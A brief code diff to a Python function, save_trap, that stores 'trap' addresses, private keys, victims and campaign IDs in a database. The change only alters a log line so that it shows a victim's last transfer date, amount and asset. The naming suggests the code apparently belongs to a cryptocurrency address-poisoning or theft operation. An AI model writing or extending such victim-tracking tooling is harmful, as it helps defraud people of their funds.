@@ -387,7 +387,7 @@ def save_trap(counterparty, victim, private_key, campaign_id, batch_id=None, tra
             for key, value in transfer_data.items():
                 if value is not None:
                     data[key] = value
-            logger.debug(f"Copied transfer data from pending_target: {transfer_data}")
+            logger.info(f"📋 Copied transfer data: date={transfer_data.get('last_transfer_date')}, amount={transfer_data.get('last_transfer_amount')}, asset={transfer_data.get('last_transfer_asset')}")
         supabase.table("traps").insert(data).execute()
         logger.info(f"Inserted trap {trap_address} for campaign {campaign_id} (batch: {batch_id[:8]}...)")
     except Exception as e:
